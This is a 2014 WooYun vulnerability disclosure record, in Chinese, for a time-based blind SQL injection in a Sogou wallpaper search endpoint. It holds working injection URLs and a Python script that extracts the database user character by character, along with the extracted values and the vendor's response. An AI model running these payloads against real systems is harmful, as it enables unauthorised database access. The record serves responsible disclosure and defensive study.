{"id": 49288, "wybug_id": "wooyun-2014-079396", "wybug_title": "搜狗SQL注入之五壁纸的SQL盲注漏洞", "wybug_corp": "搜狗", "wybug_author": "lijiejie", "wybug_date": "2014-10-14 22:39", "wybug_open_date": "2014-11-28 22:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-28：\t细节向公众公开  简要描述： 搜狗SQL注入5: 壁纸的SQL注入 详细说明：  壁纸搜索的一处MySQL盲注：下述链接延迟4秒左右，可知参数width可注入：http://so.bizhi.sogou.com/iosquery?dn=iPhone6,2&dr=640*1136&dv=8.0.2&h=aaaaaaa&height=1136&r=0000-0000&v=1.3.4.0005&width=aa%22%2b(select(0)from(select(sleep(4)))v)%2b%22&word=test下述链接，可猜解当前user()长度为23：http://so.bizhi.sogou.com/iosquery?dn=iPhone6,2&dr=640*1136&dv=8.0.2&h=aaaaaaa&height=1136&r=0000-0000&v=1.3.4.0005&width=aa%22%2b(select(0)from(select(sleep(if(length(user())=23,5,0))))v)%2b%22&word=test延时5秒后，页面会出现：“The page you are looking for is temporarily unavailable.”写几行python脚本，根据返回的时间是否大于5秒 且 是否出现特征字符串，猜解user()。\nimport httplibimport timeimport stringimport sysimport randomimport urllibheaders = {    'Cookie': '',    'User-Agent': 'Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',}payloads = list(string.ascii_lowercase)payloads += list(string.ascii_uppercase)for i in range(0,10):    payloads.append(str(i))payloads += ['@','_', '.']print 'Current user() is:'user = ''for i in range(1,24,1):    for payload in payloads:        conn = httplib.HTTPConnection('so.bizhi.sogou.com', timeout=30)        rand_num = str(random.random())        url = '/iosquery?dn=iPhone6,2&dr=640*1136&dv=8.0.2&h=aaaaaaa&height=1136&r=0000-0000&v=1.3.4.0005&' + \\              'width=aa%22%2b(select(0)from(select(sleep(if(ascii(mid(user(),' + str(i) + \\              ',1))=' + str(ord(payload)) +  ',5,0))))v)%2b%22&word=test'        start_time = time.time()        conn.request(method='GET', url=url,                     headers = headers)        html_doc = conn.getresponse().read()        conn.close()        if time.time() - start_time > 5 and \\           html_doc.find('The page you are looking for is temporarily unavailable.') > 0:            user += payload            sys.stdout.write( user + '\\r' )            sys.stdout.flush()            break\n   漏洞证明：  猜解user()，得到：wallpaper@10.1.3.5猜解database()，得到：wallpaper好吧，这个图说明脚本是随手乱写的。哈哈\n\n   修复方案：  参数过滤   版权声明：转载请注明来源 lijiejie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2014-10-18 21:22 厂商回复： 低分原因：该漏洞之前已在SGSRC平台提交，我们正在修复。感谢支持，欢迎到SGSRC平台提交漏洞。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-15 07:26 |    \t\t老笨蛋 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:8        | 老笨蛋一个)\t\t \n  MS被撸穿了。    \n     2014-10-15 08:28 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:555 漏洞数:118        | 默默潜水)\t\t \n  我猜就有壁纸处的    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}